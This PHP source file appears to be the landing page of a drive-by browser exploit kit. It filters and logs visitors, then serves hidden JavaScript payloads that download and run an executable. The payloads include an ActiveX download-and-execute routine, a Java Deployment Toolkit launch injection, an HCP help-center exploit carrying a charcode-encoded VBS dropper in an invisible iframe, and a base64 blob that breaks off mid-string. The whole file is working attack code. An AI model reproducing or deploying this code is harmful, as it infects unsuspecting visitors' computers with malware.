<?php 
include("./config.php");
include("./" . Config::get("LibDir", "lib") . "/threadData.php");
include("./" . Config::get("LibDir", "lib") . "/sc.php");
if( !@mysql_connect(@Config::get("MysqlHost"), @Config::get("MysqlUsername"), @Config::get("MysqlPassword")) ) 
{
    throw new exception(mysql_error());
}

if( !@mysql_select_db(@Config::get("MysqlDatabase")) ) 
{
    throw new exception("unable to select database");
}

$ThreadUrl = (isset($_GET[Config::get("StatParamName")]) ? $_GET[Config::get("StatParamName")] : "");
$refererId = 0;
if( Config::get("ShowReferers") && isset($_SERVER["HTTP_REFERER"]) ) 
{
    $Referer = parse_url($_SERVER["HTTP_REFERER"]);
    $refererPuth = (isset($Referer["path"]) ? $Referer["path"] : "");
    $refererPuth .= (isset($Referer["query"]) ? "?" . $Referer["query"] : "");
    if( strpos($Referer["host"], "www.") !== false ) 
    {
        $Referer["host"] = str_replace("www.", "", $Referer["host"]);
    }

    $url = $Referer["scheme"] . "://" . $Referer["host"] . $Referer["path"];
    if( $Referer["query"] != "" ) 
    {
        $url .= "?" . $Referer["query"];
    }

    foreach( $threadData["IP"][0] as $ref ) 
    {
        if( $ref == $url ) 
        {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

    }
}

$Client = Browser::getbrowserandos();
$ip = $Client["ip"];
foreach( $threadData["IP"][1] as $ref ) 
{
    if( Browser::compareip($ip, $ref) ) 
    {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

}
if( Config::get("ShowReferers") && isset($_SERVER["HTTP_REFERER"]) && $Referer["host"] != "" ) 
{
    if( $refererPuth == "" ) 
    {
        $refererPuth = "/";
    }

    mysql_query("insert into Referers (Domain, Path) values (\"" . mysql_real_escape_string($Referer["host"]) . "\", \"" . mysql_real_escape_string($refererPuth) . "\")");
    $refererId = mysql_insert_id();
}

$selectedExploits = null;
$file = null;
$redirect = null;
$ruleID = null;
$find = 0 - 1;
for( $i = 0; $i < count($threadData["Threads"]); $i++ ) 
{
    if( $threadData["Threads"][$i]["Url"] == $ThreadUrl ) 
    {
        $find = $i;
        break;
    }

}
$ThreadID = $threadData["Threads"][$find]["ID"];
$row =& $threadData["Threads"][$find];
$uniq = null;
$i = 0;
if( $i < count($row["Rules"]) ) 
{
    $r =& $row["Rules"][$i];
    if( !(count($r["BrowsersSplit"]) == 0 || in_array($Client["BrowserID"], $r["BrowsersSplit"])) ) 
    {
        continue;
    }

    if( !(count($r["CountriesSplit"]) == 0 || in_array($Client["CountryID"], $r["CountriesSplit"])) ) 
    {
        continue;
    }

    if( !(count($r["OsesSplit"]) == 0 || in_array($Client["OSID"], $r["OsesSplit"])) ) 
    {
        continue;
    }

    if( $r["TrafficType"] != 0 && $uniq === null ) 
    {
        $res = mysql_query("select 1 from Logs where IP = inet_aton('" . $Client["ip"] . "')");
        $uniq = mysql_num_rows($res) == 0;
    }

    if( !($r["TrafficType"] == 0 || $uniq && $r["TrafficType"] == 1 || !$uniq && $r["TrafficType"] == 2) ) 
    {
        continue;
    }

    $ruleID = $r["ID"];
    if( $r["isRedirect"] ) 
    {
        foreach( $r["RedirectsSplit"] as $red ) 
        {
            $limit = findredirect($red["ID"]);
            if( $limit == 0 ) 
            {
                continue;
            }

            $redirect = $red;
            break;
        }
    }
    else
    {
        $selectedExploits = $r["ExploitsSplit"];
        foreach( $r["FilesSplit"] as $f ) 
        {
            $limit = findfile($f["ID"]);
            if( $limit == 0 ) 
            {
                continue;
            }

            $file = $f["ID"];
            break;
        }
    }

    break;
}
else
{
    if( $redirect != NULL ) 
    {
        $red = $redirect["Title"];
        _obfuscated_0D2A1B220E082729120F092B3C5C0301283E5B042A2A22_($redirect["ID"]);
        if( strpos($red, "http://") === false ) 
        {
            $red = "http://" . $red;
        }

        $sql = "insert into Logs (IP, CountryID, BrowserID, BrowserVersion, OSID, ThreadID, RuleID, DateTime, IPStatus, ExploitID, FileID, RefererID, Deleted, Redirect) values (\r\n\t\t\tinet_aton('" . $Client["ip"] . "'),\r\n\t\t\t" . $Client["CountryID"] . ",\r\n\t\t\t" . $Client["BrowserID"] . ",\r\n\t\t\t\"" . $Client["version"] . "\",\r\n\t\t\t" . $Client["OSID"] . ",\r\n\t\t\t" . $ThreadID . ",\r\n\t\t\t" . $ruleID . ",\r\n\t\t\t" . time() . ",\r\n\t\t\t0,\r\n\t\t\t0,\r\n\t\t\t0,\r\n\t\t\t" . $refererId . ",\r\n\t\t\t0,\r\n\t\t\t1)";
        mysql_query($sql);
        header("Location: " . $red);
        exit();
    }

    if( $file === NULL ) 
    {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

    include("./" . Config::get("LibDir", "lib") . "/js.php");
    $sql = "insert into Logs (IP, CountryID, BrowserID, BrowserVersion, OSID, ThreadID, RuleID, DateTime, IPStatus, ExploitID, FileID, RefererID, Deleted) values (\r\n\t\t\tinet_aton('" . $Client["ip"] . "'),\r\n\t\t\t" . $Client["CountryID"] . ",\r\n\t\t\t" . $Client["BrowserID"] . ",\r\n\t\t\t\"" . $Client["version"] . "\",\r\n\t\t\t" . $Client["OSID"] . ",\r\n\t\t\t" . $ThreadID . ",\r\n\t\t\t" . $ruleID . ",\r\n\t\t\t" . time() . ",\r\n\t\t\t0,\r\n\t\t\t0,\r\n\t\t\t0,\r\n\t\t\t" . $refererId . ",\r\n\t\t\t0)";
    mysql_query($sql);
    $exploitsContent = "";
    $exploitsContent_NOJS = "";
    $urltoexe = "http://" . $_SERVER["SERVER_NAME"] . str_replace(basename(__FILE__), Config::get("DownloadFileName") . ".php", $_SERVER["PHP_SELF"]) . "?f=" . $file . "&e=";
    $urltofolder = "http://" . $_SERVER["SERVER_NAME"] . str_replace(basename(__FILE__), "", $_SERVER["PHP_SELF"]);
    $setTimeOut = 0;
    if( in_array("0", $selectedExploits) && $Client["name"] == "msie" && version_compare($Client["version"], "7.0", "<") ) 
    {
        $exploitsContent .= "\r\nfunction xkg(nsu,js){var mawa=null;try{mawa=nsu.CreateObject(js)}catch(e){}\r\nif(!mawa){try{mawa=nsu.CreateObject(js,\"\")}catch(e){}}\r\nif(!mawa){try{mawa=nsu.CreateObject(js,\"\",\"\")}catch(e){}}\r\nif(!mawa){try{mawa=nsu.GetObject(\"\",js)}catch(e){}}\r\nif(!mawa){try{mawa=nsu.GetObject(js,\"\")}catch(e){}}\r\nif(!mawa){try{mawa=nsu.GetObject(js)}catch(e){}}\r\nreturn(mawa);}\r\nfunction gr(sgw){var ha='" . $urltoexe . "0';qbnp=\"mxmt.exe\";var dyv=sgw.CreateObject(\"Scripting.FileSystemObject\",\"\");var sap=xkg(sgw,\"Shell.Application\");var ji=xkg(sgw,\"ADODB.Stream\");var sx=null;qbnp=dyv.BuildPath(dyv.GetSpecialFolder(2),qbnp);ji.Mode=3;try{sx=xkg(sgw,\"Microsoft.XMLHTTP\");sx.open(\"GET\",ha,false);}\r\ncatch(e){try{sx=xkg(sgw,\"MSXML2.XMLHTTP\");sx.open(\"GET\",ha,false);}\r\ncatch(e){try{sx=xkg(sgw,\"MSXML2.ServerXMLHTTP\");sx.open(\"GET\",ha,false);}\r\ncatch(e){try{sx=new XMLHttpRequest();sx.open(\"GET\",ha,false);}\r\ncatch(e){return 0;}}}}\r\nji.Type=1;sx.send(null);rb=sx.responseBody;ji.Open();ji.Write(rb);ji.SaveTofile(qbnp,2);sap.ShellExecute(qbnp);return 1;}\r\nfunction ewvf(){var pabl=0;var lhqh=new Array('BD96C556-65A3-11D0-983A-00C04FC29E36','BD96C556-65A3-11D0-983A-00C04FC29E30','AB9BCEDD-EC7E-47E1-9322-D4A210617116','0006F033-0000-0000-C000-000000000046','0006F03A-0000-0000-C000-000000000046','6e32070a-766d-4ee6-879c-dc1fa91d2fc3','6414512B-B978-451D-A0D8-FCFDF33E833C','7F5B7F63-F06F-4331-8A26-339E03C0AE3D','06723E09-F4C2-43c8-8358-09FCD1DB0766','639F725F-1B2D-4831-A9FD-874847682010','BA018599-1DB3-44f9-83B4-461454C84BF8','D0C07D56-7C69-43F1-B4A0-25F5A11FAB19','E8CCCDDF-CA28-496b-B050-6C07C962476B',null);while(lhqh[pabl]){var sgw=null;sgw=document.createElement(\"object\");sgw.setAttribute(\"classid\",\"clsid:\"+lhqh[pabl]);if(sgw){try{var hjh=xkg(sgw,\"Shell.Application\");if(hjh){if(gr(sgw))return 1;}}catch(e){}}\r\npabl++;}\r\nzazo();};\r\n\t\t";
    }
    else
    {
        $exploitsContent .= "function ewvf(){zazo();};";
    }

    if( in_array("1", $selectedExploits) ) 
    {
        $exploitsContent .= "function zazo(){try{var cg=\"http: -J-jar -J\\\\\\\\" . Config::get("urltosmb") . "  " . $urltoexe . "1 none\";if(window.navigator.appName=='Microsoft Internet Explorer'){try{var uiu=document.createElement('OBJECT');uiu.classid='clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA';uiu.launch(cg);}catch(e){var ghtb=document.createElement('OBJECT');ghtb.classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93';ghtb.launch(cg);}}else{var uiu=document.createElement('OBJECT');var ze=document.createElement('OBJECT');uiu.type='application/npruntime-scriptable-plugin;deploymenttoolkit';ze.type='application/java-deployment-toolkit';document.body.appendChild(uiu);document.body.appendChild(ze);try{uiu.launch(cg);}catch(e){ze.launch(cg);}}}catch(e){};ai();};";
    }
    else
    {
        $exploitsContent .= "function zazo(){ai();};";
    }

    if( in_array("2", $selectedExploits) ) 
    {
        $string_hcpvbs = str_split("http://" . $_SERVER["SERVER_NAME"] . str_replace(Config::get("MainFileName") . ".php", Config::get("ExploitsDir") . "/hcp_vbs.php?f=" . $file, $_SERVER["PHP_SELF"]));
        $i = 0;
        for( $hcpvbs_url = ""; $i < count($string_hcpvbs); $i++ ) 
        {
            $hcpvbs_url .= ord($string_hcpvbs[$i]) . ",";
        }
        $exploitsContent .= "function ai(){";
        if( $Client["name"] == "msie" && version_compare($Client["version"], "7.0", ">") ) 
        {
            $exploitsContent .= "try {var o = document.createElement(\"OBJECT\");o.setAttribute(\"classid\", \"clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6\");o.setAttribute(\"uiMode\", \"invisible\");if(parseInt(o.versionInfo)<10){o.openPlayer('http://" . $_SERVER["SERVER_NAME"] . str_replace(basename(__FILE__), "", $_SERVER["PHP_SELF"]) . Config::get("ExploitsDir") . "/hcp_asx.php?f=" . $file . "');}else{var bh=\"hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=<scr\"+\"ipt defer>eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34," . $hcpvbs_url . "34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));</scr\"+\"ipt>\";var m = document.createElement('iframe');m.setAttribute('src', bh);m.setAttribute('width', 0);m.setAttribute('height', 0);m.setAttribute('frameborder', '0');document.body.appendChild(m);}} catch (e){ }";
        }
        else
        {
            if( $Client["name"] == "msie" && version_compare($Client["version"], "8.0", "<") ) 
            {
                $exploitsContent .= "var bh=\"hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=<scr\"+\"ipt defer>eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34," . $hcpvbs_url . "34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));</scr\"+\"ipt>\";var m = document.createElement('iframe');m.setAttribute('src', bh);m.setAttribute('width', 0);m.setAttribute('height', 0);m.setAttribute('frameborder', '0');document.body.appendChild(m);";
            }
            else
            {
                $exploitsContent .= "try {for (var i = 0; i < navigator.plugins.length; i++){var name = navigator.plugins[i].name;if (name.indexOf(\"Media Player\") != -1){var m = document.createElement('iframe');m.setAttribute('src', 'http://" . $_SERVER["SERVER_NAME"] . str_replace(basename(__FILE__), "", $_SERVER["PHP_SELF"]) . Config::get("ExploitsDir") . "/hcp_asx.php?f=" . $file . "');m.setAttribute('width', 0);m.setAttribute('height', 0);m.setAttribute('frameborder', '0');document.body.appendChild(m);}}}catch(e){ }";
            }

        }

        $exploitsContent .= "dsfgsdfh();};";
    }
    else
    {
        $exploitsContent .= "function ai(){dsfgsdfh();};";
    }

    if( (in_array("3", $selectedExploits) || in_array("4", $selectedExploits)) && strstr($Client["os"], "Windows") ) 
    {
        $exploitsContent .= "function dsfgsdfh(){try {" . base64_decode("ZnVuY3Rpb24gYWRkcChzcmMpe3ZhciBwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7cC5zZXRBdHRyaWJ1dGUoJ3NyYycsIHNyYyk7cC5zZXRBdHRyaWJ1dGUoJ3dpZHRoJywgMCk7cC5zZXRBdHRyaWJ1dGUoJ2hlaWdodCcsIDApO3Auc2V0QXR0cmlidXRlKCdmcmFtZWJvcmRlcicsICcwJyk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwKTt9dmFyIFBsdWdpbkRldGVjdD17aGFuZGxlcjpmdW5jdGlvbihjLGIsYSl7cmV0dXJuIGZ1bmN0aW9uKCl7YyhiLGEpfX0saXNEZWZpbmVkOmZ1bmN0aW9uKGIpe3JldHVybiB0eXBlb2YgYiE9InVuZGVmaW5lZCJ9LGlzQXJyYXk6ZnVuY3Rpb24oYil7cmV0dXJuKGImJmIuY29uc3RydWN0b3I9PT1BcnJheSl9LGlzRnVuYzpmdW5jdGlvbihiKXtyZXR1cm4gdHlwZW9mIGI9PSJmdW5jdGlvbiJ9LGlzU3RyaW5nOmZ1bmN0aW9uKGIpe3JldHVybiB0eXBlb2YgYj09InN0cmluZyJ9LGlzTnVtOmZ1bmN0aW9uKGIpe3JldHVybiB0eXBlb2YgYj09Im51bWJlciJ9LGlzU3RyTnVtOmZ1bmN0aW9uKGIpe3JldHVybih0eXBlb2YgYj09InN0cmluZyImJigvXGQvKS50ZXN0KGIpKX0sZ2V0TnVtUmVneDovW1xkXVtcZFwuXF8sLV0qLyxzcGxpdE51bVJlZ3g6L1tcLlxfLC1dL2csZ2V0TnVtOmZ1bmN0aW9uKGIsYyl7dmFyIGQ9dGhpcyxhPWQuaXNTdHJOdW0oYik/KGQuaXNEZWZpbmVkKGMpP25ldyBSZWdFeHAoYyk6ZC5nZXROdW1SZWd4KS5leGVjKGIpOm51bGw7cmV0dXJuIGE/YVswXS5yZXBsYWNlKGQuc3BsaXROdW1SZWd4LCIsIik6bnVsbH0sY29tcGFyZU51bXM6ZnVuY3Rpb24oaCxmLGQpe3ZhciBlPXRoaXMsYyxiLGEsZz1wYXJzZUludDtpZihlLmlzU3RyTnVtKGgpJiZlLmlzU3RyTnVtKGYpKXtpZihlLmlzRGVmaW5lZChkKSYmZC5jb21wYXJlTnVtcyl7cmV0dXJuIGQuY29tcGFyZU51bXMoaCxmKX1jPWguc3BsaXQoZS5zcGxpdE51bVJlZ3gpO2I9Zi5zcGxpdChlLnNwbGl0TnVtUmVneCk7Zm9yKGE9MDthPE1hdGgubWluKGMubGVuZ3RoLGIubGVuZ3RoKTthKyspe2lmKGcoY1thXSwxMCk+ZyhiW2FdLDEwKSl7cmV0dXJuIDF9aWYoZyhjW2FdLDEwKTxnKGJbYV0sMTApKXtyZXR1cm4gLTF9fX1yZXR1cm4gMH0sZm9ybWF0TnVtOmZ1bmN0aW9uKGIsYyl7dmFyIGQ9dGhpcyxhLGU7aWYoIWQuaXNTdHJOdW0oYikpe3JldHVybiBudWxsfWlmKCFkLmlzTnVtKGMpKXtjPTR9Yy0tO2U9Yi5yZXBsYWNlKC9ccy9nLCIiKS5zcGxpdChkLnNwbGl0TnVtUmVneCkuY29uY2F0KFsiMCIsIjAiLCIwIiwiMCJdKTtmb3IoYT0wO2E8NDthKyspe2lmKC9eKDArKSguKykkLy50ZXN0KGVbYV0pKXtlW2FdPVJlZ0V4cC4kMn1pZihhPmN8fCEoL1xkLykudGVzdChlW2FdKSl7ZVthXT0iMCJ9fXJldHVybiBlLnNsaWNlKDAsNCkuam9pbigiLCIpfSwkJGhhc01pbWVUeXBlOmZ1bmN0aW9uKGEpe3JldHVybiBmdW5jdGlvbihkKXtpZighYS5pc0lFKXt2YXIgYyxiLGUsZj1hLmlzU3RyaW5nKGQpP1tkXTpkO2ZvcihlPTA7ZTxmLmxlbmd0aDtlKyspe2lmKC9bXlxzXS8udGVzdChmW2VdKSYmKGM9bmF2aWdhdG9yLm1pbWVUeXBlc1tmW2VdXSkmJihiPWMuZW5hYmxlZFBsdWdpbikmJihiLm5hbWV8fGIuZGVzY3JpcHRpb24pKXtyZXR1cm4gY319fXJldHVybiBudWxsfX0sZmluZE5hdlBsdWdpbjpmdW5jdGlvbihsLGUsYyl7dmFyIGo9dGhpcyxoPW5ldyBSZWdFeHAobCwiaSIpLGQ9KCFqLmlzRGVmaW5lZChlKXx8ZSk/L1xkLzowLGs9Yz9uZXcgUmVnRXhwKGMsImkiKTowLGE9bmF2aWdhdG9yLnBsdWdpbnMsZz0iIixmLGIsbTtmb3IoZj0wO2Y8YS5sZW5ndGg7ZisrKXttPWFbZl0uZGVzY3JpcHRpb258fGc7Yj1hW2ZdLm5hbWV8fGc7aWYoKGgudGVzdChtKSYmKCFkfHxkLnRlc3QoUmVnRXhwLmxlZnRDb250ZXh0K1JlZ0V4cC5yaWdodENvbnRleHQpKSl8fChoLnRlc3QoYikmJighZHx8ZC50ZXN0KFJlZ0V4cC5sZWZ0Q29udGV4dCtSZWdFeHAucmlnaHRDb250ZXh0KSkpKXtpZigha3x8IShrLnRlc3QobSl8fGsudGVzdChiKSkpe3JldHVybiBhW2ZdfX19cmV0dXJuIG51bGx9LGdldE1pbWVFbmFibGVkUGx1Z2luOmZ1bmN0aW9uKGEsZSl7dmFyIGQ9dGhpcyxiLGM9bmV3IFJlZ0V4cChlLCJpIik7aWYoKGI9ZC5oYXNNaW1lVHlwZShhKSkmJihiPWIuZW5hYmxlZFBsdWdpbikmJihjLnRlc3QoYi5kZXNjcmlwdGlvbnx8IiIpfHxjLnRlc3QoYi5uYW1lfHwiIikpKXtyZXR1cm4gYn1yZXR1cm4gMH0sZ2V0UGx1Z2luRmlsZVZlcnNpb246ZnVuY3Rpb24oZixiKXt2YXIgaD10aGlzLGUsZCxnLGEsYz0tMTtpZihoLk9TPjJ8fCFmfHwhZi52ZXJzaW9ufHwhKGU9aC5nZXROdW0oZi52ZXJzaW9uKSkpe3JldHVybiBifWlmKCFiKXtyZXR1cm4gZX1lPWguZm9ybWF0TnVtKGUpO2I9aC5mb3JtYXROdW0oYik7ZD1iLnNwbGl0KGguc3BsaXROdW1SZWd4KTtnPWUuc3BsaXQoaC5zcGxpdE51bVJlZ3gpO2ZvcihhPTA7YTxkLmxlbmd0aDthKyspe2lmKGM+LTEmJmE+YyYmZFthXSE9IjAiKXtyZXR1cm4gYn1pZihnW2FdIT1kW2FdKXtpZihjPT0tMSl7Yz1hfWlmKGRbYV0hPSIwIil7cmV0dXJuIGJ9fX1yZXR1cm4gZX0sQVhPOndpbmRvdy5BY3RpdmVYT2JqZWN0LGdldEFYTzpmdW5jdGlvbihiLGEpe3ZhciBnPW51bGwsZixkPWZhbHNlLGM9dGhpczt0cnl7Zz1uZXcgYy5BWE8oYik7ZD10cnVlfWNhdGNoKGYpe31pZihjLmlzRGVmaW5lZChhKSl7ZGVsZXRlIGc7cmV0dXJuIGR9cmV0dXJuIGd9LGNvbnZlcnRGdW5jczpmdW5jdGlvbihmKXt2YXIgYSxnLGQsYj0vXltcJF1bXCRdLyxjPXt9O2ZvcihhIGluIGYpe2lmKGIudGVzdChhKSl7Y1thXT0xfX1mb3IoYSBpbiBjKXt0cnl7Zz1hLnNsaWNlKDIpO2lmKGcubGVuZ3RoPjAmJiFmW2ddKXtmW2ddPWZbYV0oZil9fWNhdGNoKGQpe319fSxpbml0U2NyaXB0OmZ1bmN0aW9uKCl7dmFyIGM9dGhpcyxhPW5hdmlnYXRvcixkPSIvIixoPWEudXNlckFnZW50fHwiIixmPWEudmVuZG9yfHwiIixiPWEucGxhdGZvcm18fCIiLGc9YS5wcm9kdWN0fHwiIjtjLk9TPSgvd2luL2kpLnRlc3QoYik/MTooKC9tYWMvaSkudGVzdChiKT8yOigoL2xpbnV4L2kpLnRlc3QoYik/Mzo0KSk7Yy5jb252ZXJ0RnVuY3MoYyk7Yy5pc0lFPW5ldyBGdW5jdGlvbigicmV0dXJuICIrZCsiKkBjY19vbiFAKiIrZCsiZmFsc2UiKSgpO2MudmVySUU9Yy5pc0lFJiYoL01TSUVccyooXGQrXC4/XGQqKS9pKS50ZXN0KGgpP3BhcnNlRmxvYXQoUmVnRXhwLiQxLDEwKTpudWxsO2MuQWN0aXZlWEVuYWJsZWQ9ZmFsc2U7aWYoYy5pc0lFKXt2YXIgZSxpPVsiTXN4bWwyLlhNTEhUVFAiLCJNc3htbDIuRE9NRG9jdW1lbnQiLCJNaWNyb3NvZnQuWE1MRE9NIiwiU2hvY2t3YXZlRmxhc2guU2hvY2t3YXZlRmxhc2giLCJURENDdGwuVERDQ3RsIiwiU2hlbGwuVUlIZWxwZXIiLCJTY3JpcHRpbmcuRGljdGlvbmFyeSIsIndtcGxheWVyLm9jeCJdO2ZvcihlPTA7ZTxpLmxlbmd0aDtlKyspe2lmKGMuZ2V0QVhPKGlbZV0sMSkpe2MuQWN0aXZlWEVuYWJsZWQ9dHJ1ZTticmVha319Yy5oZWFkPWMuaXNEZWZpbmVkKGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKT9kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdOm51bGx9Yy5pc0dlY2tvPSgvR2Vja28vaSkudGVzdChnKSYmKC9HZWNrb1xzKlwvXHMqXGQvaSkudGVzdChoKTtjLnZlckdlY2tvPWMuaXNHZWNrbz9jLmZvcm1hdE51bSgoL3J2XHMqXDpccyooW1wuXCxcZF0rKS9pKS50ZXN0KGgpP1JlZ0V4cC4kMToiMC45Iik6bnVsbDtjLmlzU2FmYXJpPSgvU2FmYXJpXHMqXC9ccypcZC9pKS50ZXN0KGgpJiYoL0FwcGxlL2kpLnRlc3QoZik7Yy5pc0Nocm9tZT0oL0Nocm9tZVxzKlwvXHMqXGQvaSkudGVzdChoKTtjLmlzT3BlcmE9KC9PcGVyYVxzKltcL10/XHMqKFxkK1wuP1xkKikvaSkudGVzdChoKTtjLnZlck9wZXJhPWMuaXNPcGVyYSYmKCgvVmVyc2lvblxzKlwvXHMqKFxkK1wuP1xkKikvaSkudGVzdChoKXx8MSk/cGFyc2VGbG9hdChSZWdFeHAuJDEsMTApOm51bGw7Yy5hZGRXaW5FdmVudCgibG9hZCIsYy5oYW5kbGVyKGMucnVuV0xmdW5jcyxjKSl9LGluaXQ6ZnVuY3Rpb24oZCxhKXt2YXIgYz10aGlzLGI7aWYoIWMuaXNTdHJpbmcoZCkpe3JldHVybiAtM31pZihkLmxlbmd0aD09MSl7Yy5nZXRWZXJzaW9uRGVsaW1pdGVyPWQ7cmV0dXJuIC0zfWI9Y1tkLnRvTG93ZXJDYXNlKCkucmVwbGFjZSgvXHMvZywiIildO2lmKCFifHwhYi5nZXRWZXJzaW9uKXtyZXR1cm4gLTN9Yy5wbHVnaW49YjtpZighYy5pc0RlZmluZWQoYi5pbnN0YWxsZWQpfHxhPT10cnVlKXtiLmluc3RhbGxlZD1iLnZlcnNpb249Yi52ZXJzaW9uMD1iLmdldFZlcnNpb25Eb25lPW51bGw7Yi4kPWN9Yy5nYXJiYWdlPWZhbHNlO2lmKGMuaXNJRSYmIWMuQWN0aXZlWEVuYWJsZWQpe2lmKGIhPT1jLmphdmEpe3JldHVybiAtMn19cmV0dXJuIDF9LGZQdXNoOmZ1bmN0aW9uKGIsYSl7dmFyIGM9dGhpcztpZihjLmlzQXJyYXkoYSkmJihjLmlzRnVuYyhiKXx8KGMuaXNBcnJheShiKSYmYi5sZW5ndGg+MCYmYy5pc0Z1bmMoYlswXSkpKSl7YVthLmxlbmd0aF09Yn19LGNhbGxBcnJheTpmdW5jdGlvbihiKXt2YXIgYz10aGlzLGE7aWYoYy5pc0FycmF5KGIpKXtmb3IoYT0wO2E8Yi5sZW5ndGg7YSsrKXtpZihiW2FdPT09bnVsbCl7cmV0dXJufWMuY2FsbChiW2FdKTtiW2FdPW51bGx9fX0sY2FsbDpmdW5jdGlvbihjKXt2YXIgYj10aGlzLGE9Yi5pc0FycmF5KGMpP2MubGVuZ3RoOi0xO2lmKGE+MCYmYi5pc0Z1bmMoY1swXSkpe2NbMF0oYixhPjE/Y1sxXTowLGE+Mj9jWzJdOjAsYT4zP2NbM106MCl9ZWxzZXtpZihiLmlzRnVuYyhjKSl7YyhiKX19fSwkJGlzTWluVmVyc2lvbjpmdW5jdGlvbihhKXtyZXR1cm4gZnVuY3Rpb24oaCxnLGQsYyl7dmFyIGU9YS5pbml0KGgpLGYsYj0tMTtpZihlPDApe3JldHVybiBlfWY9YS5wbHVnaW47Zz1hLmZvcm1hdE51bShhLmlzTnVtKGcpP2cudG9TdHJpbmcoKTooYS5pc1N0cmluZyhnKT9hLmdldE51bShnKToiMCIpKTtpZighYS5pc1N0ck51bShnKSl7cmV0dXJuIC0zfWlmKGYuZ2V0VmVyc2lvbkRvbmUhPTEpe2YuZ2V0VmVyc2lvbihkLGMpO2lmKGYuZ2V0VmVyc2lvbkRvbmU9PT1udWxsKXtmLmdldFZlcnNpb25Eb25lPTF9fWEuY2xlYW51cCgpO2lmKGYuaW5zdGFsbGVkIT09bnVsbCl7Yj1mLmluc3RhbGxlZDw9MC41P2YuaW5zdGFsbGVkOihmLnZlcnNpb249PT1udWxsPzA6KGEuY29tcGFyZU51bXMoZi52ZXJzaW9uLGcsZik+PTA/MTotMSkpfXJldHVybiBifX0sZ2V0VmVyc2lvbkRlbGltaXRlcjoiLCIsJCRnZXRWZXJzaW9uOmZ1bmN0aW9uKGEpe3JldHVybiBmd